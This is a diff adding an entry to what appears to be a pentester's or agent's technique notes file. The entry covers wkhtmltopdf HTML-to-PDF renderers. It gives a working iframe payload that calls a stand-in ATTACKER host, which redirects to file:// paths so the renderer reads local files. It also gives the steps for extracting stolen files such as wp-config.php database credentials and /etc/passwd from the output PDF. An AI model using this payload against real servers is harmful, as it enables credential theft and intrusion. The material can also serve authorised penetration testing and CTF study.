@@ -856,3 +856,21 @@ time does not separate them either. Enumerate the reachable HTTP roots instead.
 <!-- promoted-slug: ssrf-loopback-only-vhost -->
 
 <!-- promoted-slug: for-a-blind-oob-confirmed-ssrf-two-cheap-differential-replay -->
+
+## wkhtmltopdf / HTML-to-PDF: http->file:// redirect = arbitrary local file READ (LFI, not just SSRF)
+
+Server-side HTML-to-PDF renderers (wkhtmltopdf/QtWebKit and similar) that reflect a raw-HTML field
+give SSRF via `<iframe src="http://internal">`. A **direct** `<iframe src="file:///etc/passwd">` is
+blocked — BUT the renderer FOLLOWS an http->file:// **redirect**, so escalate SSRF to arbitrary LOCAL
+FILE READ as the render user:
+```
+# attacker HTTP server: GET /?u=<url>  ->  302 Location: <url>
+<iframe width=1400 height=1800 src="http://ATTACKER/?u=file:///var/www/html/wp-config.php"></iframe>
+```
+The file renders INTO the PDF; download it and extract text with `mutool draw -F text out.pdf` (or
+`pdftotext`). Gotchas: `/proc/*` size-0 files render blank (QtWebKit reads by stat size); a JS
+`XMLHttpRequest` to `file://` is cross-origin-blocked from the http-origin page, so the redirect-iframe
+is the reliable primitive. Reads any file readable by the renderer's user (usually www-data) — e.g.
+`wp-config.php` DB creds, apache vhost confs, `/etc/passwd`.
+
+<!-- promoted-slug: wkhtmltopdf-redirect-to-file-lfi -->
